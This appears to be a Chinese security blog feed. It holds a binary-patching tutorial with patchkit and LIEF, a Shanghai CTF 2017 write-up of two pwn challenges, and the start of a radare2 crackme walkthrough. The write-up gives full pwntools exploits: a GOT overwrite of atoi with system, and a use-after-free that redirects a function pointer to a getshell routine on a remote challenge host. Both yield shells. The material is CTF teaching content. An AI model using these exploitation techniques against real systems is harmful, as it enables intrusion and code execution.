<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">def replace_free(pt):</div><div class="line">    printf_addr = 0x400548;// call printf 时的地址</div><div class="line">    new_printf = pt.inject(c=r&apos;&apos;&apos;</div><div class="line">void fix_printf(char *fmt) &#123;</div><div class="line">    for (int i = 0; fmt[i]; ++i)</div><div class="line">    &#123;</div><div class="line">        if (fmt[i] == &apos;%&apos; &amp;&amp; fmt[i+1] == &apos;n&apos;) &#123;</div><div class="line">           //找到后，通过前移的方式删除字符，每次删掉一个。</div><div class="line">            int len=0;</div><div class="line">            int j;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            len=0;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            </div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            //i--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(printf_addr, new_printf);</div></pre></td></tr></table></figure>
<p>64位程序，修改 malloc函数的参数为 <code>0x20</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x040057A;  //call malloc的位置</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov rdi,0x20</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr, new_malloc);</div></pre></td></tr></table></figure></p>
<p>32位，由于与栈进行操作，要注意保存还原返回地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    pop eax</div><div class="line">    pop ebx</div><div class="line">    push 0x20</div><div class="line">    push eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov eax,0x20</div><div class="line">    mov [esp+4], eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<h4 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h4><p>程序地址：<a href="https://github.com/lief-project/LIEF" target="_blank" rel="external">https://github.com/lief-project/LIEF</a></p>
<p>使用这个工具可以很方便的 patch <code>elf</code>， <code>pe</code>，<code>MachO</code> 文件。本文以<code>elf</code>  为例。</p>
<p><strong>通过交换导入导出符号</strong></p>
<p>首先看第一个测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">  puts(&quot;/bin/sh&quot;);</div><div class="line">  return EXIT_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们的目标是让他调用 <code>puts</code> 变成调用 <code>system</code></p>
<p><strong>方案一</strong></p>
<p>修改 libc 中的相关符号，然后使用 <code>LD_LIBRARY_PATH</code> 加载我们修改后的库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line">libc = lief.parse(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, libc.dynamic_symbols)[0]</div><div class="line">system_sym = filter(lambda e: e.name == &quot;system&quot;, libc.dynamic_symbols)[0]</div><div class="line"></div><div class="line"># swap them</div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line">system_sym.name = &quot;puts&quot;</div><div class="line">libc.write(&quot;libc.so.6&quot;)</div><div class="line"></div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p>首先拿到 puts 和 system 符号对象，然后交换他们的名称。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064081347di3rwx94.png?imageslim" alt="paste image"><br>成功</p>
<p><strong>方案二</strong></p>
<p>直接修改目标文件的导入符号，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, hashme.imported_symbols)[0]</div><div class="line"></div><div class="line"># set puts to system </div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line"></div><div class="line">hashme.write(&quot;hashme.patch&quot;)</div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064333755d675x70o.png?imageslim" alt="paste image"></p>
<p><strong>直接增加代码进行patch</strong></p>
<h6 id="修改库函数"><a href="#修改库函数" class="headerlink" title="修改库函数"></a>修改库函数</h6><p>测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;math.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">  if (argc != 2) &#123;</div><div class="line">    printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</div><div class="line">    exit(-1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  int a = atoi(argv[1]);</div><div class="line">  printf(&quot;exp(%d) = %f\n&quot;, a, exp(a));</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>目标是hook <code>exp</code> 函数，直接增加一个 <code>segments</code> , 然后劫持函数指针到这里。首先编译一个 <code>lib</code> 用来提供用于 <code>hook</code> 的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div></pre></td></tr></table></figure>
<p>hook.c 的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">double hook(double x) &#123;</div><div class="line">  return x + 100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后看脚本内容，很清晰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import lief</div><div class="line"></div><div class="line">libm = lief.parse(&quot;/lib/x86_64-linux-gnu/libm-2.23.so&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = libm.add(hook.segments[0])</div><div class="line"></div><div class="line">print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address))</div><div class="line"></div><div class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</div><div class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</div><div class="line"></div><div class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div><div class="line"></div><div class="line">libm.write(&quot;libm.so.6&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065215828nuiov7ys.png?imageslim" alt="paste image"></p>
<h5 id="通过-got-plt-表-直接劫持程序"><a href="#通过-got-plt-表-直接劫持程序" class="headerlink" title="通过 got/plt 表 直接劫持程序"></a>通过 got/plt 表 直接劫持程序</h5><p>测试程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">// Damn_YoU_Got_The_Flag</div><div class="line">char password[] = &quot;\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b&quot;;</div><div class="line"></div><div class="line">inline int check(char* input);</div><div class="line"></div><div class="line">int check(char* input) &#123;</div><div class="line">  for (int i = 0; i &lt; sizeof(password) - 1; ++i) &#123;</div><div class="line">    password[i] ^= 0x5c;</div><div class="line">  &#125;</div><div class="line">  return memcmp(password, input, sizeof(password) - 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line"></div><div class="line">  if (check(argv[1]) == 0) &#123;</div><div class="line">    puts(&quot;You got it !!&quot;);</div><div class="line">    return EXIT_SUCCESS;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  puts(&quot;Wrong&quot;);</div><div class="line">  return EXIT_FAILURE;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>hook.c</code> 内容，hook memcpy, 打印内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &quot;arch/x86_64/syscall.c&quot;</div><div class="line">#define stdout 1</div><div class="line"></div><div class="line">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div><div class="line"></div><div class="line">int my_memcmp(const void* lhs, const void* rhs, int n) &#123;</div><div class="line">  const char msg[] = &quot;Hook add\n&quot;;</div><div class="line">  _write(stdout, msg, sizeof(msg));</div><div class="line">  _write(stdout, (const char*)lhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  _write(stdout, (const char*)rhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>hook 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">crackme = lief.parse(&quot;crackme.bin&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = crackme.add(hook.segments[0])</div><div class="line"></div><div class="line">my_memcmp = hook.get_symbol(&quot;my_memcmp&quot;)</div><div class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div><div class="line"></div><div class="line">crackme.patch_pltgot(&apos;memcmp&apos;, my_memcmp_addr)</div><div class="line">crackme.write(&quot;crackme.hooked&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065926275fzlkcrtw.png?imageslim" alt="paste image"><br>参考：</p>
<p><a href="https://lief.quarkslab.com/doc/tutorials/" target="_blank" rel="external">https://lief.quarkslab.com/doc/tutorials/</a></p>
<p><a href="https://github.com/lunixbochs/patchkit" target="_blank" rel="external">https://github.com/lunixbochs/patchkit</a></p>
]]></content>
      
        <categories>
            
            <category> 文件patch </category>
            
        </categories>
        
        
        <tags>
            
            <tag> patch </tag>
            
            <tag> elf patch </tag>
            
            <tag> pe patch </tag>
            
            <tag> mach-o patch </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上海ctf2017 pwn100 && pwn200]]></title>
      <url>/2017/11/05/shctf2017_pwn100_pwn200.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尽量详细，给有需要的学弟们看看<br>分析的 idb 文件在这：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/shanghaictf" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/shanghaictf</a></p>
<h3 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h3><p>程序是一个经典的 堆管理程序，基本增删改查功能。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098962009599uzwpyqa.png?imageslim" alt="paste image"></p>
<p><code>add</code> 功能很正常，分配8字节的内存然后写入8字节内容。把 分配到的 <code>heap</code>指针存到 <code>table</code> 中，然后 <code>count++</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509896434623h6e9584f.png?imageslim" alt="paste image"></p>
<p>我们调试看看，使用 <code>add</code> 功能然后 看看堆的内容</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098965027379oqb1bwg.png?imageslim" alt="paste image"></p>
<p>可以看到尽管 <code>malloc(8)</code> 实际会分配 <code>0x20</code> 字节（0x10 chunk结构 + 8 + 8 字节 对齐padding）<br>所以这里应该没有溢出的问题，但是注意 <code>count</code> 变量会索引到下一个没有使用的 <code>table</code> 表项。</p>
<p>这个程序的问题在于，在 <code>get_last</code>, <code>edit</code> 时会直接使用 <code>table[count]</code> 来获取要处理的指针， 而且在 <code>delete</code> 时就只是简单的 <code>count--</code>,而且<code>count</code> 是一个有符号整数。这样多次 <code>delete</code> 后，<code>count</code> 会变成 负数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509934315611x779r1bk.png?imageslim" alt="paste image"></p>
<p>然后 通过<code>table[count]</code>（<code>*(table + count*8)</code>） ,这样我们就可以通过<code>get_last</code>, <code>edit</code>来 泄露内存和 修改内存了。</p>
<p><code>ctf</code> 中利用漏洞的目标一般就是执行 <code>system(&#39;sh&#39;)</code>,在这里我们可以通过修改 <code>got</code> 表中<code>atoi</code>函数的指针为 <code>system</code> 的函数，然后在调用 <code>atoi</code> 函数时，就会去调用 <code>system</code> 函数了。为什么要选择 <code>atoi</code> 函数作为目标呢？</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15099347624636c7nenso.png?imageslim" alt="paste image"><br>在打印程序的菜单后，会要我们输入一个选项，这就会调用这个函数，可以看到他会读取 <code>16</code> 字节到 <code>nptr</code>, 然后传到 <code>atoi</code>,如果我们把 <code>atoi</code> 改成<code>system</code>, 然后输入 <code>sh</code> , 就会执行 <code>system(&#39;sh&#39;)</code> 了，目标达到。</p>
<p>由于是这样获取内存地址： <code>*(table + count*8)</code>， 所以我们需要在 <code>table</code> 的上面（就是地址 &lt; table的地址） 区域找到一个 指向 <code>got</code> 的指针。我们可以使用 <code>pwndbg</code> 的 <code>searchmem</code> 来搜索</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935326266sve8pr7a.png?imageslim" alt="paste image"></p>
<p>属于</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935380746in5n7zt4.png?imageslim" alt="paste image"></p>
<p>那么现在利用的思路就很清晰了。</p>
<ul>
<li>首先多次调用 <code>delete</code> 函数使得 <code>table + count*8</code> 指向 这里的 <code>atoi</code> 函数对应的地址，也就是 <code>0x400588</code>.</li>
</ul>
<ul>
<li><p>然后我们就可以通过 <code>get_last</code> 功能打印 <code>atoi</code> 函数的地址，通过<code>atoi</code> 在 <code>libc</code> 中的固定偏移，泄露 <code>libc</code> 的地址。</p>
</li>
<li><p>然后获取 <code>system</code> 函数地址，然后使用 <code>edit</code> 修改 <code>atoi</code> 函数的地址改成 <code>system</code>函数地址。然后输入<code>sh</code>  即可。</p>
</li>
</ul>
<p>exp(要跑 20几分钟左右):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &apos;debug&apos;</div><div class="line">p = process(&quot;./list&quot;)</div><div class="line"></div><div class="line">puts_plt = 0x602018</div><div class="line"></div><div class="line"></div><div class="line">def add(content):</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.recvuntil(&quot;Input your content:\n&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"></div><div class="line">def get_last_content():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.recvuntil(&apos;4.Delete&apos;)</div><div class="line">    p.recvuntil(&apos;5.Exit\n&apos;)</div><div class="line">    content = p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    addr = u64(content[:6].ljust(8, &apos;\x00&apos;))</div><div class="line">    hexdump(content)</div><div class="line">    hexdump(content)</div><div class="line">    return addr</div><div class="line"></div><div class="line"></div><div class="line">def edit(content):</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"></div><div class="line">def delete():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line"></div><div class="line"># alloc 3 chunk before to 3</div><div class="line"></div><div class="line"></div><div class="line">def get_count_to_addr(addr):</div><div class="line">    time = 0x602080 + 3 * 8 - addr</div><div class="line">    time = time / 8</div><div class="line"></div><div class="line">    print time</div><div class="line">    for i in range(time):</div><div class="line">        # sleep(0.5)</div><div class="line">        delete()</div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p)</div><div class="line"></div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(p64(puts_plt))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">get_count_to_addr(0x400588)</div><div class="line"></div><div class="line">print &quot;modify the count to fushu&quot;</div><div class="line">pause()</div><div class="line"></div><div class="line">print &quot;::::&quot; * 10</div><div class="line"></div><div class="line">atoi_addr = get_last_content()</div><div class="line">libc_addr = atoi_addr - 0x36e80</div><div class="line">system_addr = libc_addr + 0x45390</div><div class="line"></div><div class="line">log.success(&quot;system: &quot; + hex(system_addr))</div><div class="line"></div><div class="line">edit(p64(system_addr))</div><div class="line"></div><div class="line">log.success(&quot;modify atoi---&gt; system&quot;)</div><div class="line"></div><div class="line">p.sendline(&quot;sh&quot;)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"># bp 0x0400924</div></pre></td></tr></table></figure>
<h3 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h3><p>就是用<code>c++</code> 写的程序比较难看，不过看到程序的菜单，漏洞就很清楚了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936031356ptc0dds9.png?imageslim" alt="paste image"><br>提示的很明显了，应该是 <code>uaf</code>, 那我们就重点看看与内存分配相关的位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936258753devxv5lf.png?imageslim" alt="paste image"></p>
<p>首先会分配两个结构体，其中开始8字节被写入了函数的指针。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936430537ciumch55.png?imageslim" alt="paste image"><br>可以看到内存块的大小为 <code>0x40</code> 大小。通过 <code>new(0x30)</code> 分配得到，所以 <code>new</code> 和 <code>malloc</code> 的分配方式应该是一样的。接着往下看。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150993658543336ohfyxh.png?imageslim" alt="paste image"><br>选择<code>2</code> 时，可以有我们提供大小，传到 <code>new</code> ,然后通过 <code>read</code> 写入内容。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936668993dl8aosz9.png?imageslim" alt="paste image"></p>
<p><code>free</code> 时会调用 <code>delete</code>  释放掉内存块。<code>free</code> 之后可以看到进入了<code>fastbin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15099367564697zfv0v57.png?imageslim" alt="paste image"><br>那此时我们使用 <code>2</code> 号功能，连续分配两块 <code>48</code>(0x30) 字节的内存，就会拿到这两块内存了。</p>
<p>程序中内置了<code>getshell</code>函数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937226801kdjz5ggb.png?imageslim" alt="paste image"></p>
<p>所以我们在拿到那两块内存后，把开始 8 字节写成 <code>getshell-8</code> 函数的地址就行了。（减8的原因看下图）<br>然后使用 <code>1</code> 功能，就能调用了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937318915n5tt0od8.png?imageslim" alt="paste image"></p>
<p>exp中把 开始 8 字节改成了  <code>0x0602D50</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509946173632ju0gczy8.png?imageslim" alt="paste image"><br>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># p = process(&quot;./p200&quot;)</div><div class="line">p = remote(&quot;106.75.8.58&quot;, 12333)</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">get_shell = p64(0x0602D50)</div><div class="line"></div><div class="line">payload = get_shell</div><div class="line">payload += &quot;A&quot; * (48 - len(payload))</div><div class="line"></div><div class="line"># gdb.attach(p)</div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&apos;3&apos;)</div><div class="line"># 先释放掉那两个块</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line">sleep(0.5)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"># 分配两个块，占用刚刚释放的块， 开始8字节 为 0x0602D50</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之radare2使用实战]]></title>
      <url>/2017/11/01/step_by_step_pwn_router_part8.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>前文讲了一些 <code>radare2</code> 的特性相关的操作方法。本文以一个 <code>crackme</code> 来具体介绍下 <code>radare2</code> 的使用</p>
<p>程序的地址： <a href="https://gitee.com/hac425/blog_data/blob/master/crackme0x03" target="_blank" rel="external">在这里</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>radare2</code> 加载该程序。使用了 <code>aaa</code> 分析了程序中的所有函数。使用 <code>iI</code> 查看二进制文件的信息。可以看到是 <code>32</code> 位的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536312825toj2ruk1.png?imageslim" alt="paste image"></p>
<p>使用 <code>aaa</code>分析完程序后，可以使用 <code>afl</code> 查看所有的函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536413775tyxowxq5.png?imageslim" alt="paste image"><br>直接跳到 <code>main</code> 函数看看逻辑</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15095364686834obsuwoc.png?imageslim" alt="paste image"></p>
<p>不习惯看文本模式的汇编的话，可以使用 <code>VV</code> 进入图形化模式<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536557600j6sv26da.png?imageslim" alt="paste image"></p>
